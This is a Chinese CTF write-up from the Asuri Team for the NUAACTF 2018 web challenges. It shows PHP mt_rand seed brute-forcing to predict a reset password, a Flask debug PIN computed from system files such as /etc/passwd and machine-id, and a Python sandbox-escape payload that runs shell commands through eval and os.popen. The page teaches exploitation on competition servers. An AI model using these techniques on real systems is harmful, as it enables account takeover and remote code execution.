<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  <title>NUAACTF_2018 官方wp | Asuri Team</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta name="description" content="2018南京航空航天大学第三届“补天杯”信息安全竞赛解题报告（2018NUAACTF Writeup）">
<meta name="keywords" content="writeup,nuaactf">
<meta property="og:type" content="article">
<meta property="og:title" content="NUAACTF_2018 官方wp">
<meta property="og:url" content="http://asuri.org/2018/12/25/NUAACTF-2018-官方wp/index.html">
<meta property="og:site_name" content="Asuri Team">
<meta property="og:description" content="2018南京航空航天大学第三届“补天杯”信息安全竞赛解题报告（2018NUAACTF Writeup）">
<meta property="og:locale" content="cn">
<meta property="og:image" content="https://ws1.sinaimg.cn/large/64ef14dcly1fyhj2xspy3j21ma1641kx.jpg">
<meta property="og:image" content="https://ws1.sinaimg.cn/large/64ef14dcly1fyhj2z3q4rj21ne16ukee.jpg">
<meta property="og:image" content="https://ws1.sinaimg.cn/large/64ef14dcly1fyhj5gec83j21p01687wh.jpg">
<meta property="og:image" content="https://ws1.sinaimg.cn/large/64ef14dcly1fyhj5htvfcj21kk1501fx.jpg">
<meta property="og:image" content="https://ws1.sinaimg.cn/large/64ef14dcly1fyhjfizh8pj21yg150qay.jpg">
<meta property="og:image" content="https://ws1.sinaimg.cn/large/64ef14dcly1fyhjhb6wn6j211o0kkjuq.jpg">
<meta property="og:image" content="https://ws1.sinaimg.cn/large/64ef14dcly1fyhjksc5oij20o20hitam.jpg">
<meta property="og:image" content="https://ws1.sinaimg.cn/large/64ef14dcgy1fyi1650iujj21kg16g7wh.jpg">
<meta property="og:image" content="https://ws1.sinaimg.cn/large/64ef14dcgy1fyi1dv0agwj228017wn4v.jpg">
<meta property="og:image" content="https://ws1.sinaimg.cn/large/64ef14dcgy1fyi1fdbkonj228017ygtf.jpg">
<meta property="og:image" content="https://ws1.sinaimg.cn/large/64ef14dcgy1fyi1lzc5jej228017qdry.jpg">
<meta property="og:image" content="https://ws1.sinaimg.cn/large/64ef14dcgy1fyi9o8be0bj227616s7hc.jpg">
<meta property="og:image" content="https://ws1.sinaimg.cn/large/64ef14dcgy1fyia0yt2bij228017s47p.jpg">
<meta property="og:image" content="https://ws1.sinaimg.cn/large/64ef14dcgy1fyiauiinyrj227w180jx9.jpg">
<meta property="og:image" content="https://ws1.sinaimg.cn/large/64ef14dcgy1fyiaul3dphj228017ogqx.jpg">
<meta property="og:image" content="https://ws1.sinaimg.cn/large/64ef14dcgy1fyiaw8k1jjj2280180jwx.jpg">
<meta property="og:image" content="https://ws1.sinaimg.cn/large/64ef14dcgy1fyibr7mtsvj21yo13444v.jpg">
<meta property="og:image" content="https://ws1.sinaimg.cn/large/64ef14dcgy1fyibz19mwyj21yu18qwmv.jpg">
<meta property="og:image" content="https://ws1.sinaimg.cn/large/64ef14dcgy1fyidhkjy5wj21z218sguq.jpg">
<meta property="og:image" content="https://ws1.sinaimg.cn/large/64ef14dcgy1fyidhhna5tj21ys18gww2.jpg">
<meta property="og:image" content="https://ws1.sinaimg.cn/large/64ef14dcgy1fyidkqxytej21yu190k01.jpg">
<meta property="og:image" content="https://ws1.sinaimg.cn/large/64ef14dcgy1fyidsve7dlj21yq0v0n5d.jpg">
<meta property="og:image" content="https://ws1.sinaimg.cn/large/64ef14dcgy1fyidsyg0uaj2102038adb.jpg">
<meta property="og:image" content="https://ws1.sinaimg.cn/large/64ef14dcgy1fyidw0hu30j228018kdpv.jpg">
<meta property="og:image" content="https://ws1.sinaimg.cn/large/64ef14dcgy1fyidyds8e7j227w18uk1b.jpg">
<meta property="og:image" content="https://ws1.sinaimg.cn/large/64ef14dcgy1fyie2v8gsnj2280196qfm.jpg">
<meta property="og:image" content="https://ws1.sinaimg.cn/large/64ef14dcgy1fyieei3nmoj2280192tlm.jpg">
<meta property="og:image" content="https://ws1.sinaimg.cn/large/64ef14dcgy1fyieefah7pj227y18qgwt.jpg">
<meta property="og:image" content="https://ws1.sinaimg.cn/large/006daSSqgy1fy8sxqzmwjj31ea0hx78u.jpg">
<meta property="og:image" content="https://ws1.sinaimg.cn/large/006daSSqgy1fy8syh9uwzj30se0i4gmx.jpg">
<meta property="og:updated_time" content="2020-11-16T16:08:33.874Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="NUAACTF_2018 官方wp">
<meta name="twitter:description" content="2018南京航空航天大学第三届“补天杯”信息安全竞赛解题报告（2018NUAACTF Writeup）">
<meta name="twitter:image" content="https://ws1.sinaimg.cn/large/64ef14dcly1fyhj2xspy3j21ma1641kx.jpg">
  
    <link rel="alternate" href="/atom.xml" title="Asuri Team" type="application/atom+xml">
  
  
    <link rel="icon" href="/favicon.png">
  
  
    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
  
  <link rel="stylesheet" href="/css/style.css">
  

</head>

<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">Asuri Team</a>
      </h1>
      
        <h2 id="subtitle-wrap">
          <a href="/" id="subtitle">Asuri Secure yoUR Information.</a>
        </h2>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
        
        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://asuri.org"></form>
      </div>
    </div>
  </div>
</header>
      <div class="outer">
        <section id="main"><article id="post-NUAACTF-2018-官方wp" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2018/12/25/NUAACTF-2018-官方wp/" class="article-date">
  <time datetime="2018-12-25T04:23:41.000Z" itemprop="datePublished">2018-12-25</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/Writeup/">Writeup</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 class="article-title" itemprop="name">
      NUAACTF_2018 官方wp
    </h1>
  


  <div class="article-author">
    <img src="https://www.gravatar.com/avatar/204a0c779acdb62f9084826396f6dccb?s=48">
    <div class="article-author-info">
      <a href="/author/zedd" class="article-author-name">Zedd</a>
      <a href="https://blog.zeddyu.info" class="article-author-site" title="Visit the author's site">[site]</a>
      <div class="article-author-about" title="Newer of Web Security">Newer of Web Security</div>
    </div>
  </div>


      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>2018南京航空航天大学第三届“补天杯”信息安全竞赛解题报告（2018NUAACTF Writeup）</p>
<a id="more"></a>
<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="Web1-Asuri-Information-System"><a href="#Web1-Asuri-Information-System" class="headerlink" title="Web1    Asuri-Information-System"></a>Web1    Asuri-Information-System</h3><h4 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">http://ctf.asuri.org:8001</div><div class="line"></div><div class="line">听说有五个很厉害的人，一个是admin,一个是admin1,一个是admin2,一个是admin3,一个是admin4。听说打败他们其中一个就可以拿到flag啦</div><div class="line"></div><div class="line">flag格式为NUAACTF&#123;.*&#125;</div></pre></td></tr></table></figure>
<h4 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h4><p>根据题目描述，我们要做的肯定就是要去登录<code>admin[1-4] || admin</code>了。</p>
<p>首先进入题目界面，发现题目功能很简单，首页只提供注册登录两个功能。</p>
<p><img src="https://ws1.sinaimg.cn/large/64ef14dcly1fyhj2xspy3j21ma1641kx.jpg" alt=""></p>
<p><img src="https://ws1.sinaimg.cn/large/64ef14dcly1fyhj2z3q4rj21ne16ukee.jpg" alt=""></p>
<p>我们先随便登录注册一下，进去后发现有个重置密码的功能。</p>
<p><img src="https://ws1.sinaimg.cn/large/64ef14dcly1fyhj5gec83j21p01687wh.jpg" alt=""></p>
<p><img src="https://ws1.sinaimg.cn/large/64ef14dcly1fyhj5htvfcj21kk1501fx.jpg" alt=""></p>
<p>重置一下抓包看看。</p>
<p><img src="https://ws1.sinaimg.cn/large/64ef14dcly1fyhjfizh8pj21yg150qay.jpg" alt=""></p>
<p>然后真的发现自己邮箱里面多了一封重置密码的邮件。</p>
<p><img src="https://ws1.sinaimg.cn/large/64ef14dcly1fyhjhb6wn6j211o0kkjuq.jpg" alt=""></p>
<p>扫目录可以得到<code>www.zip</code>，发现题目的所有基本源码。</p>
<p><img src="https://ws1.sinaimg.cn/large/64ef14dcly1fyhjksc5oij20o20hitam.jpg" alt=""></p>
<h4 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h4><p>基本的信息如上，然后我们可以根据已有信息来看，从那个重置密码请求包来看，貌似我们可以控制重置用户的用户名。那我们是不是可以重置<code>amdin</code>的密码，通过什么方式登录上呢，而且那个请求包还有回显了一个<code>int</code>也比较奇怪，看起来像是<code>var_dump()</code>出来的数据。</p>
<p>通过大概的代码审计，题目用了在<code>sql</code>语句的地方预编译，所以没什么办法注入得到<code>admin</code></p>
<p>查看<code>handler</code>源码:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">require &quot;./config.php&quot;;</div><div class="line">require &quot;./email.php&quot;;</div><div class="line"></div><div class="line">function generatePasswd()&#123;</div><div class="line">    mt_srand((double) microtime() * 1000000);</div><div class="line">    var_dump(mt_rand());</div><div class="line">    return substr(md5(mt_rand()),0,6);</div><div class="line">&#125;</div><div class="line"></div><div class="line">function changePasswd($username, $password)&#123;</div><div class="line">    $password = md5($password);</div><div class="line">    $stmt = $GLOBALS[&apos;dbh&apos;]-&gt;prepare(&quot;UPDATE users SET password = ? WHERE username = ?&quot;);</div><div class="line">    $stmt-&gt;bind_param(&apos;ss&apos;, $password, $username);</div><div class="line">    $stmt-&gt;execute();</div><div class="line">    if ($stmt-&gt;affected_rows === 1)&#123;</div><div class="line">        echo &quot;&lt;script&gt;alert(\&quot;Success!\&quot;);history.back(-1);&lt;/script&gt;&quot;;</div><div class="line">        return;</div><div class="line">    &#125;</div><div class="line">    else</div><div class="line">        echo &quot;&lt;script&gt;alert(\&quot;Error!\&quot;);history.back(-1);&lt;/script&gt;&quot;;</div><div class="line">    $stmt-&gt;free_result();</div><div class="line">    $stmt-&gt;close();</div><div class="line">&#125;</div><div class="line"></div><div class="line"></div><div class="line">function getEmail($username)&#123;</div><div class="line">    if ($username)&#123;</div><div class="line">        $stmt = $GLOBALS[&apos;dbh&apos;]-&gt;prepare(&quot;SELECT email From users where username = ?&quot;);</div><div class="line">        $stmt-&gt;bind_param(&apos;s&apos;, $username);</div><div class="line">        $stmt-&gt;bind_result($email);</div><div class="line">        $stmt-&gt;execute();</div><div class="line">        if($stmt-&gt;fetch())&#123;</div><div class="line">            return $email;</div><div class="line">        &#125;</div><div class="line">        else</div><div class="line">            return &quot;error!&quot;;</div><div class="line">        $stmt-&gt;free_result();</div><div class="line">        $stmt-&gt;close();</div><div class="line">    &#125;</div><div class="line">    else&#123;</div><div class="line">        return &quot;error!&quot;;</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line">$username = isset($_POST[&apos;username&apos;]) ? trim($_POST[&apos;username&apos;]) : NULL;</div><div class="line">$email = getEmail($username);</div><div class="line">if ($email == &quot;error!&quot;)&#123;</div><div class="line">    echo &quot;Error!&quot;;</div><div class="line">    die();</div><div class="line">&#125;</div><div class="line">$passwd = generatePasswd();</div><div class="line">if(sendMail($email,$passwd))&#123;</div><div class="line">    changePasswd($username,$passwd);</div><div class="line">&#125;</div><div class="line">else&#123;</div><div class="line">    echo &quot;&lt;script&gt;alert(\&quot;Error! Check your Email address plz!\&quot;);history.back(-1);&lt;/script&gt;&quot;;</div><div class="line">&#125;</div><div class="line"></div><div class="line">?&gt;</div><div class="line">&lt;!DOCTYPE html&gt;</div><div class="line">&lt;html&gt;</div><div class="line"></div><div class="line">&lt;head&gt;</div><div class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</div><div class="line">    &lt;title&gt;Asuri-Team Managment System&lt;/title&gt;</div><div class="line">&lt;/head&gt;</div><div class="line">&lt;body&gt;</div><div class="line"></div><div class="line">&lt;/body&gt;</div></pre></td></tr></table></figure>
<p>通过代码审计，我们可以看到传入的<code>username</code>到了<code>getEmail</code>这个函数，这个函数用了预编译，所以我们没什么办法注入。这个函数就是根据<code>username</code>返回对应<code>email</code>，通过<code>generatePasswd()</code>产生随机密码，通过<code>sendMail()</code>发送密码到邮箱，最后用<code>changePasswd()</code>来修改数据库中的密码。</p>
<p>整个逻辑基本清楚了，所以我们是可以通过传入一个<code>username=admin</code>来重置管理员的密码。但是怎么登录成<code>admin</code>呢，我们是不是可以通过爆破随机密码或者破解随机密码来登录呢。</p>
<p>我们重点看看<code>generatePasswd()</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">generatePasswd</span><span class="params">()</span></span>&#123;</div><div class="line">    mt_srand((double) microtime() * <span class="number">1000000</span>);</div><div class="line">    var_dump(mt_rand());</div><div class="line">    <span class="keyword">return</span> substr(md5(mt_rand()),<span class="number">0</span>,<span class="number">6</span>);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>我们可以看到，页面上的<code>int(2055522123)</code>即是<code>var_dump(mt_rand());</code>的显示结果。</p>
<p>可以看看</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">void mt_srand ([ int $seed ] )</div><div class="line">用 seed 来给随机数发生器播种。 没有设定 seed 参数时，会被设为随时数。</div><div class="line"></div><div class="line">Note: 自 PHP <span class="number">4.2</span><span class="number">.0</span> 起，不再需要用 srand() 或 mt_srand() 给随机数发生器播种 ，因为现在是由系统自动完成的。</div></pre></td></tr></table></figure>
<p>然后随机数种子是<code>(double) microtime() * 1000000</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">mixed microtime ([ bool $get_as_float ] )</div><div class="line">microtime() 当前 Unix 时间戳以及微秒数。本函数仅在支持 gettimeofday() 系统调用的操作系统下可用。</div><div class="line"></div><div class="line">如果调用时不带可选参数，本函数以 <span class="string">"msec sec"</span> 的格式返回一个字符串，其中 sec 是自 Unix 纪元（<span class="number">0</span>:<span class="number">00</span>:<span class="number">00</span> January <span class="number">1</span>, <span class="number">1970</span> GMT）起到现在的秒数，msec 是微秒部分。字符串的两部分都是以秒为单位返回的。</div><div class="line"></div><div class="line">如果给出了 get_as_float 参数并且其值等价于 <span class="keyword">TRUE</span>，microtime() 将返回一个浮点数。</div><div class="line"></div><div class="line">Note: get_as_float 参数是 PHP <span class="number">5.0</span><span class="number">.0</span> 新加的。</div></pre></td></tr></table></figure>
<p>所以这里<code>microtime() * 1000000</code>是不超过7位数的，而且第一次随机数我们已经得到了，我们可以通过爆破随机数种子来得到随机数。</p>
<p>贴一个自己写的<code>php exp</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="comment">// echo ((double) microtime() * 1000000)."\n";</span></div><div class="line"><span class="comment">// mt_srand((double) microtime() * 1000000);</span></div><div class="line"><span class="comment">// var_dump(mt_rand());</span></div><div class="line"><span class="comment">// echo substr(md5(mt_rand()),0,6);</span></div><div class="line"></div><div class="line"></div><div class="line"><span class="comment">// int(1409622410)</span></div><div class="line"><span class="comment">// bc700b</span></div><div class="line"></div><div class="line">$seed = <span class="number">0</span>;</div><div class="line"><span class="keyword">for</span>($i = <span class="number">0</span>;$i &lt; <span class="number">1000000</span>; $i++)&#123;</div><div class="line">    mt_srand($i);</div><div class="line">    $str = mt_rand();</div><div class="line">    <span class="keyword">if</span>($str === <span class="number">1796651235</span>)&#123;</div><div class="line">        $seed = $i;</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"><span class="keyword">echo</span> $seed.<span class="string">"\n"</span>;</div><div class="line">mt_srand($seed);</div><div class="line">mt_rand();</div><div class="line"><span class="keyword">echo</span> substr(md5(mt_rand()),<span class="number">0</span>,<span class="number">6</span>);</div></pre></td></tr></table></figure>
<p>猜解得到密码登录就可以得到<code>flag</code></p>
<p><img src="https://ws1.sinaimg.cn/large/64ef14dcgy1fyi1650iujj21kg16g7wh.jpg" alt=""></p>
<p>这里避免给大家竞争随机…就给了5个<code>amdin</code>，其实应该注册一个就对应给一个<code>admin</code>，但是感觉5个应该差不多了…</p>
<h3 id="Web2-男航理工大学选课系统"><a href="#Web2-男航理工大学选课系统" class="headerlink" title="Web2    男航理工大学选课系统"></a>Web2    男航理工大学选课系统</h3><h4 id="题目描述-1"><a href="#题目描述-1" class="headerlink" title="题目描述"></a>题目描述</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">http://ctf.asuri.org:8003</div><div class="line"></div><div class="line">小火汁，听说你想选课？</div><div class="line"></div><div class="line">flag格式为NUAACTF&#123;.*&#125;</div></pre></td></tr></table></figure>
<h4 id="信息收集-1"><a href="#信息收集-1" class="headerlink" title="信息收集"></a>信息收集</h4><p>题目设置非常简单</p>
<p><img src="https://ws1.sinaimg.cn/large/64ef14dcgy1fyi1dv0agwj228017wn4v.jpg" alt=""></p>
<p><img src="https://ws1.sinaimg.cn/large/64ef14dcgy1fyi1fdbkonj228017ygtf.jpg" alt=""></p>
<p>就一个登录注册界面。然后给了一个<code>www.zip</code>的附件，放出了关键源码。</p>
<p>然后，随便点一个选课，就报错了。</p>
<p><img src="https://ws1.sinaimg.cn/large/64ef14dcgy1fyi1lzc5jej228017qdry.jpg" alt=""></p>
<p>再看看源码，其中在<code>user.py</code>中发现</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="meta">@users.route('/asserts/&lt;path:path&gt;')</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">static_handler</span><span class="params">(path)</span>:</span></div><div class="line">    filename = os.path.join(app.root_path,<span class="string">'asserts'</span>,path)</div><div class="line">    <span class="keyword">if</span> os.path.isfile(filename):</div><div class="line">        <span class="keyword">return</span> send_file(filename)</div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        abort(<span class="number">404</span>)</div></pre></td></tr></table></figure>
<h4 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h4><p>这个题熟悉<code>flask</code>的会发现，那个报错页面其实就是开启了<code>debug</code>的界面，我们可以利用<code>pin</code>码来认证<code>debug</code>界面进行命令执行。</p>
<p>而关于<code>pin</code>码，我看赛时很多队伍都采取爆破的方式，导致输入过多，就不能再输入了。就导致我赛时只能人肉运维重置<code>web2</code>。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">md5_list = [</div><div class="line">    &apos;root&apos;, #当前用户，可通过读取/etc/passwd获取</div><div class="line">    &apos;flask.app&apos;, #一般情况为固定值</div><div class="line">    &apos;Flask&apos;, #一般情况为固定值</div><div class="line">    &apos;/usr/local/lib/python2.7/dist-packages/flask/app.pyc&apos;, #可通过debug错误页面获取</div><div class="line">    &apos;2485377892354&apos;, #mac地址的十进制，通过读取/sys/class/net/eth0/address获取mac地址  如果不是映射端口 可以通过arp ip命令获取</div><div class="line">    &apos;0c5b39a3-bba2-472c-a43d-8e013b2874e8&apos; #机器名，通过读取/proc/sys/kernel/random/boot_id 或/etc/machine-id获取</div><div class="line">    ]</div></pre></td></tr></table></figure>
<p>生成<code>pin</code>码的代码</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_pin</span><span class="params">(md5_list)</span>:</span></div><div class="line">	h = hashlib.md5()</div><div class="line">	<span class="keyword">for</span> bit <span class="keyword">in</span> md5_list:</div><div class="line">		<span class="keyword">if</span> <span class="keyword">not</span> bit:</div><div class="line">			<span class="keyword">continue</span></div><div class="line">		<span class="keyword">if</span> isinstance(bit, unicode):</div><div class="line">			bit = bit.encode(<span class="string">'utf-8'</span>)</div><div class="line">		h.update(bit)</div><div class="line">	h.update(<span class="string">b'cookiesalt'</span>)</div><div class="line">	h.update(<span class="string">b'pinsalt'</span>)</div><div class="line">	num = (<span class="string">'%09d'</span> % int(h.hexdigest(), <span class="number">16</span>))[:<span class="number">9</span>]</div><div class="line">	<span class="keyword">for</span> group_size <span class="keyword">in</span> <span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>:</div><div class="line">		<span class="keyword">if</span> len(num) % group_size == <span class="number">0</span>:</div><div class="line">			rv = <span class="string">'-'</span>.join(num[x:x + group_size].rjust(group_size, <span class="string">'0'</span>)</div><div class="line">						  <span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">0</span>, len(num), group_size))</div><div class="line">			<span class="keyword">break</span></div><div class="line">	<span class="keyword">else</span>:</div><div class="line">		rv = num</div><div class="line">	<span class="keyword">return</span> rv</div></pre></td></tr></table></figure>
<p>拿到pin码便可执行命令。</p>
<p>具体可以参考<a href="https://xz.aliyun.com/t/2553" target="_blank" rel="external">Flask debug pin安全问题</a></p>
<p>贴一下这题得到的<code>exp</code></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> hashlib</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_pin</span><span class="params">(md5_list)</span>:</span></div><div class="line">	h = hashlib.md5()</div><div class="line">	<span class="keyword">for</span> bit <span class="keyword">in</span> md5_list:</div><div class="line">		<span class="keyword">if</span> <span class="keyword">not</span> bit:</div><div class="line">			<span class="keyword">continue</span></div><div class="line">		<span class="keyword">if</span> isinstance(bit, unicode):</div><div class="line">			bit = bit.encode(<span class="string">'utf-8'</span>)</div><div class="line">		h.update(bit)</div><div class="line">	h.update(<span class="string">b'cookiesalt'</span>)</div><div class="line">	h.update(<span class="string">b'pinsalt'</span>)</div><div class="line">	num = (<span class="string">'%09d'</span> % int(h.hexdigest(), <span class="number">16</span>))[:<span class="number">9</span>]</div><div class="line">	<span class="keyword">for</span> group_size <span class="keyword">in</span> <span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>:</div><div class="line">		<span class="keyword">if</span> len(num) % group_size == <span class="number">0</span>:</div><div class="line">			rv = <span class="string">'-'</span>.join(num[x:x + group_size].rjust(group_size, <span class="string">'0'</span>)</div><div class="line">						  <span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">0</span>, len(num), group_size))</div><div class="line">			<span class="keyword">break</span></div><div class="line">	<span class="keyword">else</span>:</div><div class="line">		rv = num</div><div class="line">	<span class="keyword">return</span> rv</div><div class="line"></div><div class="line">name = get_name()</div><div class="line">md5_list = [</div><div class="line">    <span class="string">'ctf'</span>,</div><div class="line">    <span class="string">'flask.app'</span>,</div><div class="line">    <span class="string">'Flask'</span>,</div><div class="line">    <span class="string">'/usr/local/lib/python2.7/dist-packages/flask/app.pyc'</span>,</div><div class="line">    <span class="string">'2485378285570'</span>,</div><div class="line">    <span class="string">''</span></div><div class="line">    ]</div><div class="line"></div><div class="line"><span class="keyword">print</span> get_pin(md5_list)</div></pre></td></tr></table></figure>
<p>这里可能比较坑的是<code>/usr/local/lib/python2.7/dist-packages/flask/app.pyc</code>跟<code>machine_id</code>是空两处。不过通过几次尝试也都可以尝试出来。难度并不算大。</p>
<p>然后就是命令执行，一个简单没有任何过滤的<code>Python</code>沙盒，方法很多。</p>
<p>这里简单给个事例</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">[console ready]</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">59</span>].__init__.func_globals.values()[<span class="number">13</span>][<span class="string">'eval'</span>](<span class="string">'__import__("os").popen("ls").read()'</span> )</div><div class="line"><span class="string">'APP\nflag\nrun.py\ntest.py\nwww.zip\n'</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">59</span>].__init__.func_globals.values()[<span class="number">13</span>][<span class="string">'eval'</span>](<span class="string">'__import__("os").popen("cat ./flag").read()'</span> )</div><div class="line"><span class="string">'NUAACTF&#123;F14sssskkkrrr_D3Bug_n0t_S4f3&#125;'</span></div></pre></td></tr></table></figure>
<p><img src="https://ws1.sinaimg.cn/large/64ef14dcgy1fyi9o8be0bj227616s7hc.jpg" alt=""></p>
<h3 id="Web3-张哥的金牌之旅"><a href="#Web3-张哥的金牌之旅" class="headerlink" title="Web3    张哥的金牌之旅"></a>Web3    张哥的金牌之旅</h3><h4 id="题目描述-2"><a href="#题目描述-2" class="headerlink" title="题目描述"></a>题目描述</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">http://ctf.asuri.org:8003/</div><div class="line"></div><div class="line">做完A+B你就可以拿金牌了。（你可能需要一个逆向哥哥来帮你</div><div class="line"></div><div class="line">小水管服务器，为了顺畅做题请大家不要用扫描器，而且这题用不到扫描器！！！</div><div class="line"></div><div class="line">flag格式为NUAACTF&#123;.*&#125;</div></pre></td></tr></table></figure>
<h4 id="信息收集-2"><a href="#信息收集-2" class="headerlink" title="信息收集"></a>信息收集</h4><p>打开发现是个<code>java</code>框架。</p>
<p><img src="https://ws1.sinaimg.cn/large/64ef14dcgy1fyia0yt2bij228017s47p.jpg" alt=""></p>
<p>提供了简单的登录注册。</p>
